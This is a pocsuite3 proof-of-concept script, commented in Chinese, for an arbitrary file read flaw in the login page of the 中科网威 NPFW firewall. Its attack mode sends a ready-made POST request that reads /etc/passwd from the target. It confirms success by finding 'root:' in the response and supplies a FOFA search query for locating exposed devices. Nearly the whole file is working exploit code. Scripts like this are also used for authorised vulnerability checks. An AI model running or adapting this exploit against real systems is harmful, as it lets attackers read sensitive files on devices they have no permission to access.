from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)

class NPFWFirewallPoc(POCBase):
    vulID = "99245"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "ZorIqz"  # PoC作者的大名
    vulDate = "2016-01-09"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-07-17"  # 编写 PoC 的日期
    updateDate = "2022-07-17"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://www.seebug.org/vuldb/ssvid-90245"]  # 漏洞地址来源,0day不用写
    name = "中科网威 NPFW防火墙 任意文件读取漏洞 Poc"  # PoC 名称
    appPowerLink = "https://www.eyou.net/"  # 漏洞厂商主页地址
    appName = "NPFW防火墙"  # 漏洞应用名称
    appVersion = "all"  # 漏洞影响版本
    vulType = VUL_TYPE.ARBITRARY_FILE_READ  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    # install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
            中科网威 NPFW防火墙登陆页面存在任意文件读取漏洞，会导致敏感文件的泄露。
        """  # 漏洞简要描述
    pocDesc = """
            登陆页面-->随便输入账号密码-->点击登录按钮抓包-->进行漏洞复现
        """  # POC用法描述
    fofa = 'title="中科网威防火墙"'
    cmdRet = ""

    def _check(self):
        # 漏洞验证代码
        url = f"{self.url}/direct/polling/CommandsPolling.php"
        cookies = {"PHPSESSID": "01efea33bd56249c869762d522adf0b7"}
        headers = {"Cache-Control": "max-age=0",
                         "Sec-Ch-Ua": r"\".Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"103\", \"Chromium\";v=\"103\"",
                         "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": r"\"Windows\"",
                         "Upgrade-Insecure-Requests": "1",
                         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
                         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                         "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1",
                         "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate",
                         "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8", "Connection": "close",
                         "Content-Type": "application/x-www-form-urlencoded"}
        data = {"command": "ping", "filename": "/etc/passwd", "cmdParam": ''}
        result = []

        # 一个异常处理 , 生怕站点关闭了 , 请求不到 , 代码报错不能运行
        try:
            res = requests.post(url=url, headers=headers, cookies=cookies, data=data, verify=False, timeout=9, allow_redirects=False)
            # 判断是否存在漏洞
            if res.status_code == 200 and "root:" in res.text:
                result.append(url)
                self.cmdRet = res.text
        except Exception as e:
            print(e)
        # 跟 try ... except是一对的 , 最终一定会执行里面的代码 , 不管你是否报错
        finally:
            return result

    def _verify(self):
        # 验证模式 , 调用检查代码 ,
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.cmdRet
        return self.parse_verify(result)

    def _attack(self):
        # 攻击模式 , 就是在调用验证模式
        return self._verify()

    def parse_verify(self, result):
        # 解析认证 , 输出
        output = Output(self)
        # 根据result的bool值判断是否有漏洞
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output

# 其他自定义的可添加的功能函数
def other_fuc():
    pass

# 其他工具函数
def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(NPFWFirewallPoc)
